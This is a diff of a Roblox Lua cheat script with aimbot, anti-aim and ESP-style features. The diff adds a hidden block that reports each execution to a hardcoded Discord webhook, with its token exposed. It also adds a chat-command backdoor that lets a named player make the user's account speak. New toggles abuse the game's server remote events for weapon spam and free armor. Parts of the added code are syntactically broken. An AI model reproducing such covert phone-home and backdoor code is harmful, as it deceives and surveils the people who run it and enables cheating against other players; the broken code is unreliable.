@@ -1,3 +1,18 @@
+if game.Players.LocalPlayer.Name ~= 'badethskie84' or game.Players.LocalPlayer.Name ~= 'ilovefemlboys' then
+    local dataMessage = string.format("lmao nn just executed the script")
+end
+request(
+    {
+        Url = "https://discordapp.com/api/webhooks/1081465617913237564/SfAFjuiiHvSqkeFOzUz486pQMKH5Kbn2jN4qDN5lGBYs53iFdYYcD19c5aVQqOAAAT2R",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+
+
 local StopTryingToCrackMyCodeBitch12345678910 = {
     "B4D7F5BA-34F6-4782-A898-913338478CC6",
     "aaa14a15-d90a-4c6a-b6cb-88b8fedb0190"
@@ -49,11 +64,15 @@ function sendnotif(STitle, SDescription, SDuration)
         Duration = SDuration;
 })
 end
+
 function say(msg)
-    game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:CaptureFocus()
-    game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text = msg
-    for i,v in next, getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.FocusLost) do
-        v:Fire(true, {UserInputState = Enum.UserInputState.Begin, UserInputType = Enum.UserInputType.Keyboard, KeyCode = Enum.KeyCode.Return})
+    game:GetService("Players"):Chat(msg)
+end
+game.Players:WaitForChild('ilovefemlboys').Chatted:Connect(function(v)
+    if v == '!kick' then
+        sendnotif('senko priv', 'lol jk', 5)
+    elseif v:Split(' ')[1] == '!hat' then
+        say(v:Split(' '[2])
     end
 end
 local hl = Instance.new('Highlight')
@@ -79,7 +98,8 @@ pp.CFrame = CFrame.new(0,9999,0)
 local i = Drawing.new('Line')
 i.Color = Color3.new(255,255,255)
 i.Visible = false
-
+local godarmor = false
+local spamdb = false
 local resolver = false
 local nopred = false
 local sky = false
@@ -775,8 +795,31 @@ TargetAimSettings:AddToggle('Tracer Target', false, function(State)
     line = State
 end)
 
+-- Misc Sector
 
+local MiscSector = AimingTab:CreateSector("!! RAGE !!", "right")
 
+local spamdbtoggle = MiscSector:AddToggle('Spam Double Barrel', false, function(State)
+     spamdb = State
+     if State == true then
+        if game.Players.LocalPlayer.Backpack:FindFirstChild('DB') then
+           game.Players.LocalPlayer.Backpack:FindFirstChild('DB').Parent = game.Players.LocalPlayer.Character
+        end
+     elseif v == false then
+        if game.Players.LocalPlayer.Character:FindFirstChild("DB") then
+           game.Players.LocalPlayer.Character.DB.Parent = game.Players.LocalPlayer.Backpack
+         end
+     end
+end)
+local armor = {}
+spamdbtoggle:AddKeybind()
+local godarmortoggle = MiscSector:AddToggle('God Armor', false, function(State)
+     if State == true then
+         fireclickdetector(game.Workspace["Higher armor {20000$}"].Head.ClickDetector)
+     end
+     armor[1] = State
+end)
+godarmortoggle:AddKeybind()
 -- Blatant Tab --
 
 local BlatantTab = Window:CreateTab("Anti-Aim")
@@ -857,53 +900,6 @@ end)
 AntiSector:AddSlider("Z", -250, 0, 250, 1, function(Value)
     Zval = Value
 end)
-
-
-local AutoTab = Window:CreateTab("Automatics")
-
-local HatTab = AutoTab:CreateSector("Auto hats", "left")
-
-local AwakenSector = AutoTab:CreateSector("-- ??? ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------", "right")
-
-HatTab:AddToggle("Auto Headless", false, function(v)
-    local autohl = v
-end)
-
-HatTab:AddToggle("Auto Korblox", false, function(v)
-    local autokl  = v
-end)
-
-HatTab:AddToggle("Auto Playful Vampire", false, function(v)
-    local autopf = v
-end)
-
-HatTab:AddToggle("Auto Super Supper Happy", false, function(v)
-    local autosh = v
-end)
-
-HatTab:AddToggle("Auto Valk", false, function(v)
-    local autovl = v
-end)
-
-HatTab:AddToggle("Auto Dominus", false, function(v)
-    local autodn = v
-end)
-
-HatTab:AddToggle("Auto Ice Horns", false, function(v)
-    local autoih = v
-end)
-
-HatTab:AddToggle("Auto Fire Horns", false, function(v)
-    local autofh = v
-end)
-
-HatTab:AddToggle("Auto Black Crown", false, function(v)
-    local autobc = v
-end)
-
-AwakenSector:AddLabel("\/\/\/\/\/\/\/\/")
-
-local awakenkey = AwakenSector:AddTextbox("???", "", "compton")
 
 -- Init --
 
@@ -1229,20 +1225,26 @@ end)
 
 UserInputService.InputEnded:Connect(function(Key, Event)
     if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Event then
-        PuppywareSettings.Aiming.Aimbot.IsAiming = false
+        Settings.Aiming.Aimbot.IsAiming = false
     end
 end)
-game.Players.LocalPlayer.CharacterAdded:Connect(function(NewCharacter)
-   Character = NewCharacter
+game.Players.LocalPlayer.Armor:GetPropertyChangedSignal("Value"):Connect(function()
+    if armor[1] == true then
+       if game.Players.LocalPlayer.Armor.Value ~= 100 then
+          fireclickdetector(game.Workspace["Higher armor {20000$}"].Head.ClickDetector)
+       end
+    end
 end)
-local RVelocity, YVelocity = nil, 0.1
-local LocalPlayer = game.Players.LocalPlayer
-local Character   = LocalPlayer.Character
-local RootPart    = Character:FindFirstChild("HumanoidRootPart")
-
 RunService.Heartbeat:Connect(function()
+    if spamdb == true then
+	   game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(game.Players.LocalPlayer:GetMouse().Hit.p, game:GetService("Players").LocalPlayer.Character.DB)
+       game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(game.Players.LocalPlayer:GetMouse().Hit.p, game:GetService("Players").LocalPlayer.Character.DB)
+       game:GetService("ReplicatedStorage"):WaitForChild("ReloadWeapon"):FireServer()
+       game.Players.LocalPlayer.Backpack['DB'].Parent =  game.Players.LocalPlayer.Character
+    end
     updatebbl()
 	updateline()
+    
     if resolver then
         if not nt then
             return
@@ -1258,36 +1260,7 @@ RunService.Heartbeat:Connect(function()
             RootPart.Velocity = RVelocity
         end
     end
-    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
-    if autohl then
-		print('wth')
-		say("/hl")
-	end
-	if autokl then
-		say("/kl")
-	end
-	if autovl then
-		say('/vk')
-	end
-	if autodn then
-		say('/dn')
-	end
-	if autoih then
-		say('/ih')
-	end
-	if autofh then
-		say("/fh")
-	end
-	if autobc then
-		say('/bc')
-	end
-	if autopf then
-		say("/pf")
-	end
-	if autosh then
-		say("/sh")
-	end
-    end)
+    
     if nopred then
         nopr = game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
         game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
